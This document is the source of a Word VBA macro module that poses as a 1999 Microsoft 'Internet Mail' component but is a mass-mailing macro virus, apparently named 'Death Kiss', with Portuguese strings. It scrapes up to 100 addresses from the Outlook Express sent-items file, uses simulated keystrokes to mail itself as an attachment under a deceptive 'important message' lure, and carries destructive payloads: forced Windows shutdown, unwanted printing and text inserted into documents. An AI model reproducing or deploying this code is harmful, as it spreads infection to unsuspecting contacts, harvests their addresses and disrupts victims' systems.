   Attribute VB_Name = "AddMail"

   'The Microsoft Word Language Visual Basic
   'Copyright (c) 1999 Microsoft
   'Todos os direitos reservados

   Sub MailNew()
   Attribute MailNew.VB_Description = "Microsoft Word (c) 1999 Corporation\r\nInternet Mail"
   Attribute MailNew.VB_ProcData.VB_Invoke_Func = "Web.AddMail.MailNew"
   Dim meucar, Meulocal
   Dim s As String
   Dim F As Long
   Dim correio, vetor(100)

   If Not Ismail() Then
     Exit Sub
     Else
      If Endmail() = "Yes" Then
        Exit Sub
      End If
   End If

   On Error Resume Next
   Open "c:\windows\application data\microsoft\outlook express\mail\Itens enviados.mbx" For Binary As #1
   Do While Meulocal < LOF(1)
       meucar = meucar & Input(2048, #1)
       Meulocal = Loc(1)
   Loop
   Close #1
   On Error GoTo 0

   v = 0
   c = 1
   flag = True

   While flag
   c = InStr(c, meucar, "<")

   If c > 0 Then
   F = InStr(c, meucar, ">")
   s = Mid(meucar, c + 1, F - c - 1)
   Else
   flag = False
   End If

   If InStr(1, s, "@") > 0 Then
   vetor(v) = s
   v = v + 1
   If v = 100 Then
      flag = False
   End If

   End If
   c = c + 1
   Wend

   For Each minhatarefa In Tasks
     If v > 0 Then
       F = InStr(1, minhatarefa.Name, "-")
       If F > 0 Then
          c = Mid(minhatarefa.Name, F + 1)
         Else
          c = minhatarefa.Name
       End If

       If InStr(1, minhatarefa.Name, "Outlook Express") > 0 Then
           On Error Resume Next
           minhatarefa.Activate
           minhatarefa.WindowState = wdWindowStateMaximize
           SendKeys "%(R)", True
           SendKeys "N", True
           Exit For
           On Error GoTo 0
       End If
   End If
   Next minhatarefa

   For Each minhatarefa In Tasks
       If InStr(minhatarefa.Name, "Nova mensagem") > 0 Then
           minhatarefa.Activate
           minhatarefa.WindowState = wdWindowStateNormal
           ucar = ""
           Stopmail
          For i = 1 To 100
           If vetor(i) <> "" Then
              ucar = ucar + vetor(i) + ";"
           End If
          Next
          ucar = ucar + "{TAB}" + "{TAB}" + "{TAB}" + "Mensagem Importante" + "{TAB}"
          ucar = ucar + "Estou lhe enviando aquele documento que vc me pediu." + "%(I)x"
          ucar = ucar + pq + "\Pesquisa de Opinião.doc" + "{ENTER}" + "%(A)T" + "{ENTER}"
          SendKeys ucar, True
       End If
   Next minhatarefa

   For Each minhatarefa In Tasks
       p = InStr(1, minhatarefa.Name, "-")
       c = ""
        If p > 0 Then
            c = Left(minhatarefa.Name, p - 1)
        End If
       If InStr(c, "Microsoft Word") > 0 Then
         minhatarefa.Activate
         Exit For
       End If
   Next
   End Sub
   Function Verday()
   Dim con
   con = Counter()

   If con >= 1000 And con <= 15000 Then
       Tasks.ExitWindows
     Else
      If con >= 80 And con <= 200 Then
        Windows.Arrange
        Windows.Application.ChangeFileOpenDirectory ("c:\windows\Temporary Internet Files")
      End If
      If con > 200 And con <= 220 Then
        Documents.Add.PrintOut
      End If

      If con > 500 And con <= 600 Then
       If Tasks.Exists("Calculadora") Then
             With Tasks("Calculadora")
                  .Activate
                  .WindowState = wdWindowStateNormal
             End With
             SendKeys Str(con), True
         Else
           Shell "calc.exe"
           Tasks("Calculadora").WindowState = wdWindowStateNormal
           SendKeys Str(con), True
        End If
      End If

   End If
   dia = WeekDay(Date)
   hora = Mid(Time(), 1, 2)
   rd = LTrim(Str(Int((24 * Rnd) + 1)))

   Texto = "((((((((((((((((((((((((( D e a t h   K i s s  )))))))))))))))))))))))))" + Chr(13)
   If dia = 6 And hora = rd Then
      Selection.EndKey Unit:=wdStory, Extend:=wdMove
      Set Doc = ActiveDocument
      Set meuIntervalo = Doc.Range(Start:=Doc.Paragraphs(1).Range.End - 1, _
          End:=Doc.Paragraphs(1).Range.End - 1)
          meuIntervalo.InsertAfter Texto
   End If
   End Function

   Function Ismail() As Boolean
   For Each minhatarefa In Tasks
   flg = False
       F = InStr(1, minhatarefa.Name, "-")
       If F > 0 Then
          c = Mid(minhatarefa.Name, F + 1)
         Else
          c = minhatarefa.Name
       End If
       If InStr(1, minhatarefa.Name, "Outlook Express") > 0 Then
          flg = True
          Exit For
       End If
   Next minhatarefa
   Ismail = flg
   End Function

   Function Stopmail() As String
    On Error Resume Next
    Open pq + "\Death End.Ini" For Output As #1
    Print #1, "Yes"
    Close #1
   On Error GoTo 0
   End Function

   Function Endmail()

   Dim ret
   ret = "No"
    On Error Resume Next
    Open pq + "\Death End.Ini" For Input As #1
    Input #1, ret
    Close #1
    On Error GoTo 0
   Endmail = ret
   End Function
